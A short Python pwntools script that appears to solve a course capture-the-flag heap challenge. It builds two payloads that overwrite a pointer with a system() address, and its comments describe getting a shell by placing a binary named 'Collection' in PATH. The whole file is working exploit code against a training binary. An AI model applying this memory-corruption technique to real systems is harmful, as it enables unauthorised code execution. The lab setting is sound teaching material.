# heap1ex.py - Aidan Wech (Onyxymous)
# /problems/heap1r-64_1_1e79de6f235f2f3c08816445d1087c7e/
from pwn import *

# ssh variables
name = 'xxxxxx'
host = 'cs4401shell2.walls.ninja'
keyfile = 'xxxxxx'
d = '/problems/heap1r-64_1_1e79de6f235f2f3c08816445d1087c7e/'

# exploit variables
retaddr2offset = 40
retaddr = 0x601018
sysaddr = 0x4004c6

# exploit strings
exploit1 = flat({
    retaddr2offset: p32(retaddr)[:6]
})

exploit2 = flat({
    8: p32(sysaddr)[:3]
})

log.info(f'Exploit 1: {exploit1}')
log.info(f'Exploit 2: {exploit2}')

# process
# create a binary that executes a shell, name it 'Collection'
# set your PATH variable to be equal to the PATH variable + the directory of the binary
# enjoy!
p = process([b'./heap1-64', exploit1, exploit2])
p.interactive()
